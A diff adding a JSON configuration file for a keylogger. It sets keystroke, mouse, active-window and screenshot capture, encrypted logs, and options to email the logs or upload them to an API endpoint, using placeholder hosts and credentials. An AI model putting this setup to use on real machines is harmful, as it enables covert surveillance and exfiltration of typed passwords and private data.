@@ -1,0 +1,52 @@
+{
+    "log_file": "keylog.txt",
+    "log_special_keys": true,
+    "log_combinations": true,
+    "exclude_keys": [
+        "Key.ctrl_l",
+        "Key.alt_l"
+    ],
+    "stop_combination": [
+        "ctrl",
+        "shift",
+        "q"
+    ],
+    "clear_combination": [
+        "ctrl",
+        "shift",
+        "x"
+    ],
+    "max_log_size": 1048576,
+    "time_format": "%Y-%m-%d %H:%M:%S",
+    "auto_stop_interval": 3600,
+    "config_auto_update": true,
+    "supported_languages": [
+        "uk_UA",
+        "en_US"
+    ],
+    "encrypt_logs": true,
+    "encryption_key": "your_secret_key",
+    "send_email": false,
+    "email_interval": 3600,
+    "email_settings": {
+        "smtp_server": "smtp.example.com",
+        "smtp_port": 587,
+        "email_from": "logger@example.com",
+        "email_to": "recipient@example.com",
+        "email_password": "password"
+    },
+    "app_filter": [
+        "notepad.exe",
+        "calc.exe"
+    ],
+    "log_active_window": true,
+    "log_language_change": true,
+    "detect_suspicious_activity": true,
+    "block_keyboard_on_suspicion": true,
+    "suspicious_threshold": 5,
+    "block_time": 10,
+    "take_screenshot_on_event": true,
+    "api_integration": true,
+    "api_url": "https://example.com/api/upload",
+    "log_mouse_activity": true
+}
